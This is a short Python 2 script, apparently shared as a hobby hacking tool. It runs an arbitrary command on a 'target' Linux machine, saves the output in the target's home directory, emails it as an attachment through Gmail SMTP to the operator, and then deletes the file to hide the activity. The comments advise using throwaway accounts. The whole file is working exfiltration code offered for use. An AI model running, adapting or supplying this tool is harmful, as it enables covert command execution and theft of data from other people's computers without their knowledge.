"""
Note: This program will run the command you give it and the output to whichever email you send it too with whatever email you decide to use.
Python Version: 2
OS: GNU/Linux
Problem(s): I don't see any problems.
Credits: Some of this code was used by PyTutorials on YouTube. If anyone at PyTutorials is reading this: Thanks guys
"""

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os.path
import getpass
import os


# Don't be stupid, use a throwaway gmail account.
em = "your@email.com"
pa = "password1234"

# Don't be stupid, use a throwaway account.
recip = "recipient@email.com"

# Put whatever you want for these two, leave them empty for all I care.
sub = "No Sub"
mesg = "No Msg"

# Target's username
tarname = getpass.getuser()

# Enter which command you want to run.
comtorun = ""

# This is where the output of comtorun will be saved.
filloc = "/home/" + tarname + "/data"

# This will tell your computer to run the command given and put it into the data file that will be sent to the recipient (you).
os.system(comtorun + " > " + filloc)

msg = MIMEMultipart()
msg['From'] = em
msg['To'] = recip
msg['Subject'] = sub

msg.attach(MIMEText(mesg,'plain'))

mi = os.path.basename(filloc)
attachment = open(filloc, "rb")
part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= %s" % mi)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(em,pa)
text = msg.as_string()
server.sendmail(em,recip,text)
server.quit()

# Time to remove the data file.
os.remove(filloc)

# Just in case
quit()
